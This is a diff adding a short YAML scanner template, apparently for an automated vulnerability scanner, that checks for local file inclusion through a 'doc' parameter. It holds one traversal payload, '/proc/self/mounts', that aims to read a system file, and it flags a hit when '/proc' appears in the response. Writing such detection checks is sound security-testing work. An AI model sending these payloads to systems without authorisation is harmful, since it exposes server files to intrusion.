@@ -1,0 +1,20 @@
+id: lfi6-1407
+name: 'Traversal in doc'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via doc'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      doc:
+        - '/proc/self/mounts'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/proc'
